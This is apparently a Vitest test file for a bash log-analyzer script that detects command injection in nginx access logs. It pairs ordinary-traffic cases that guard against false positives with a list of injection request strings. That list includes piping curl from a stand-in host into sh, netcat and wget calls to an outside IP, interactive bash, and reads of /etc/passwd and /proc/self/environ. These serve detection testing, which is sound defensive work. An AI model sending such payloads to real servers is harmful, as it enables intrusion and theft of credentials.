import { spawnSync } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { install, runFile, sandbox, scriptsDir, type Sandbox } from '../helpers/shell-sandbox.ts';

// These tests run the real log-analyzer.sh against an nginx access log written into a scratch directory.
// The script is installed the way the deploy installs it, with its /var/log/ paths and its quoted /tmp/
// paths redirected into the sandbox, the final `find /tmp` cleanup pointed at the sandbox by analyze(), and
// the log files it analyses pointed at the sandbox through its environment variables. One hard-coded path is
// not redirected: /root/murphys-laws/logs/api-error.log, which only feeds the "APPLICATION ERRORS" section
// and not the command injection section these tests read.

interface CommandInjectionReport {
  /** The report's top summary, which lists every attack category that was counted. */
  summary: string;
  /** The "COMMAND INJECTION ATTEMPTS" section of the report. */
  section: string;
}

function analyze(box: Sandbox, lines: string[]): CommandInjectionReport {
  const accessLog = path.join(box.root, 'access.log');
  writeFileSync(accessLog, `${lines.join('\n')}\n`);
  // The script's last step prunes old reports with an unquoted `find /tmp ...`, which install() leaves
  // alone. Point it at the sandbox so a test never deletes anything under the real /tmp.
  const original = readFileSync(path.join(scriptsDir, 'log-analyzer.sh'), 'utf8');
  expect(original).toContain('find /tmp ');
  const script = install(box, 'log-analyzer.sh', original.replace('find /tmp ', `find ${box.root} `), {
    withHelper: false,
  });
  const result = runFile(script, [], box, {
    NGINX_ACCESS_LOG: accessLog,
    NGINX_ERROR_LOG: path.join(box.root, 'missing-error.log'),
    AUTH_LOG: path.join(box.root, 'missing-auth.log'),
    SYSLOG: path.join(box.root, 'missing-syslog'),
    LOG_ANALYZER_LOG: path.join(box.root, 'log-analyzer.log'),
  });
  expect(result.status, result.stderr).toBe(0);
  const start = result.stdout.indexOf('COMMAND INJECTION ATTEMPTS');
  const end = result.stdout.indexOf('BRUTE FORCE ATTEMPTS');
  const summaryEnd = result.stdout.indexOf('NGINX ACCESS LOG ANALYSIS');
  expect(summaryEnd).toBeGreaterThan(-1);
  expect(start).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(start);
  return {
    summary: result.stdout.slice(0, summaryEnd),
    section: result.stdout.slice(start, end),
  };
}

const nginxLine = (request: string, userAgent = 'Mozilla/5.0') =>
  `203.0.113.7 - - [09/Nov/2026:00:00:06 +0000] "GET ${request} HTTP/1.1" 200 4708 "-" "${userAgent}"`;

// Ordinary requests modelled on the 9 November report, which was counted as 28,131 command injection
// attempts. The `&cat=5` and `;cat=5` lines are the ones that guard the separator rule after `&` and `;`.
const ORDINARY_TRAFFIC = [
  nginxLine('/law/725', 'mwmbl/1.1.2 (https://github.com/mwmbl/mwmbl/ contact mwmbl@me.stone-red.net)'),
  nginxLine('/', 'SentryUptimeBot/1.0 (+http://docs.sentry.io/product/alerts/uptime-monitoring/)'),
  nginxLine('/api/v1/laws?limit=25&offset=0&sort=score&order=desc&category_id=23'),
  nginxLine('/api/v1/laws?cat=5&limit=25'),
  nginxLine('/api/v1/laws?limit=25&cat=5&sort=score'),
  nginxLine('/api/v1/laws?limit=25;cat=5'),
  nginxLine('/search?q=cat+and+shell&sort=score'),
  // `; CAT ` in a User-Agent must not look like `;cat`.
  nginxLine('/law/41', 'Mozilla/5.0 (Linux; Android 11; CAT S62 Pro) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36'),
];

describe('log-analyzer.sh command injection detection', () => {
  it('reports nothing for ordinary traffic', () => {
    const report = analyze(sandbox(), ORDINARY_TRAFFIC);
    expect(report.section).toContain('No command injection attempts detected');
    expect(report.summary).toContain('No security issues detected in logs');
  });

  it('does not count a clean log once per pattern', () => {
    // Before the fix a pattern that began with an unescaped `|` matched every line, so the count was roughly
    // the number of requests multiplied by the number of such patterns. That only happens under GNU grep (CI
    // and the server); BSD grep on macOS rejects the pattern and counts 0, so locally this case passes against
    // the old script too. The `&category_id=` line in the ordinary-traffic test fails the old script on both.
    const report = analyze(sandbox(), Array.from({ length: 50 }, (_, i) => nginxLine(`/law/${i}`)));
    expect(report.section).toContain('No command injection attempts detected');
  });

  it.each([
    ['a piped cat', '/x?a=1|cat /etc/passwd'],
    ['a piped cat in capitals', '/x?a=1%7CCAT%20/etc/passwd'],
    ['a URL-encoded pipe', '/x?a=1%7Ccat%20/etc/passwd'],
    ['a pipe into sh', '/x?c=curl+evil.example/s|sh'],
    ['a piped nc', '/x?a=1|nc 203.0.113.9 4444'],
    ['a piped wget', '/x?a=1|wget http://203.0.113.9/a'],
    ['a piped curl', '/x?a=1|curl http://203.0.113.9/a'],
    ['a piped bash', '/x?a=1|bash -i'],
    ['an ampersand cat', '/x?a=1&cat%20/etc/hosts'],
    ['a semicolon cat', '/x?a=1;cat%20/etc/hosts'],
    ['a backtick cat', '/x?a=`cat /etc/hosts`'],
    ['a subshell cat', '/x?a=$(cat /etc/hosts)'],
    ['an encoded ampersand cat', '/x?a=1%26cat%20/etc/hosts'],
    ['an encoded semicolon cat', '/x?a=1%3Bcat%20/etc/hosts'],
    ['an encoded backtick cat', '/x?a=%60cat%20/etc/hosts%60'],
    ['an encoded subshell cat', '/x?a=%24%28cat%20/etc/hosts%29'],
    ['a semicolon cat with input redirection', '/x?a=1;cat</proc/self/environ'],
    ['a semicolon cat with an encoded redirection', '/x?a=1;cat%3C/proc/self/environ'],
    ['an ampersand cat with input redirection', '/x?a=1&cat</etc/passwd'],
    ['a semicolon cat separated by ${IFS}', '/x?a=1;cat${IFS}/etc/passwd'],
    ['a semicolon cat separated by a tab', '/x?a=1;cat%09/etc/passwd'],
    ['a pipe followed by plus-encoded spaces', '/x?a=1|+cat+/etc/passwd'],
    ['an encoded semicolon followed by plus-encoded spaces', '/x?a=1%3B+cat%20/etc/passwd'],
  ])('flags %s', (_name, request) => {
    const report = analyze(sandbox(), [...ORDINARY_TRAFFIC, nginxLine(request)]);
    // Every request below matches exactly one pattern, so the count is exactly one and the sample list holds
    // exactly one line (each sample is the log line cut to 120 characters, indented by two spaces).
    expect(report.section).toContain('Detected 1 potential command injection attempts');
    expect(report.section).toContain(request);
    expect(report.section.match(/^ {2}203\.0\.113\.7 /gm)).toHaveLength(1);
    expect(report.summary).toContain('Command Injection: 1 attempts');
  });
});

// render-daily-report.ts runs the script with `--format json`, so that path feeds the report's attack
// counts. It uses `mapfile` (bash 4+) and `jq`; macOS ships bash 3.2, so it runs in CI and on the server only.
const bashMajor = Number(
  spawnSync('bash', ['-c', 'echo "${BASH_VERSINFO[0]}"'], { encoding: 'utf8' }).stdout.trim(),
);
const jqDir = spawnSync('bash', ['-c', 'dirname "$(command -v jq)"'], { encoding: 'utf8' }).stdout.trim();
const canRunJson = bashMajor >= 4 && jqDir !== '' && jqDir !== '.';

interface JsonReport {
  summary: { totalAttackAttempts: number; attackLines: string[] };
  securityFindings: { category: string; count: number; samples: string[] }[];
}

function analyzeJson(box: Sandbox, lines: string[]): JsonReport {
  const accessLog = path.join(box.root, 'access.json.log');
  writeFileSync(accessLog, `${lines.join('\n')}\n`);
  const script = install(box, 'log-analyzer.sh', readFileSync(path.join(scriptsDir, 'log-analyzer.sh'), 'utf8'), {
    withHelper: false,
  });
  const result = runFile(script, ['--format', 'json'], box, {
    PATH: `${box.bin}:${jqDir}:/usr/bin:/bin`,
    NGINX_ACCESS_LOG: accessLog,
    NGINX_ERROR_LOG: path.join(box.root, 'missing-error.log'),
    AUTH_LOG: path.join(box.root, 'missing-auth.log'),
    SYSLOG: path.join(box.root, 'missing-syslog'),
    LOG_ANALYZER_LOG: path.join(box.root, 'log-analyzer.log'),
  });
  expect(result.status, result.stderr).toBe(0);
  return JSON.parse(result.stdout) as JsonReport;
}

describe.skipIf(!canRunJson)('log-analyzer.sh --format json command injection findings', () => {
  it('reports no attack attempts for ordinary traffic', () => {
    const report = analyzeJson(sandbox(), ORDINARY_TRAFFIC);
    expect(report.summary.totalAttackAttempts).toBe(0);
    expect(report.summary.attackLines).toEqual(['No security issues detected in logs']);
    expect(report.securityFindings.find((finding) => finding.category === 'Command Injection')).toBeUndefined();
  });

  it('reports a command injection attempt with its log line as the sample', () => {
    const attack = nginxLine('/x?a=1;cat</proc/self/environ');
    const report = analyzeJson(sandbox(), [...ORDINARY_TRAFFIC, attack]);
    expect(report.securityFindings.find((finding) => finding.category === 'Command Injection')).toEqual({
      category: 'Command Injection',
      count: 1,
      samples: [attack],
    });
    expect(report.summary.attackLines).toContain('Command Injection: 1 attempts');
  });
});
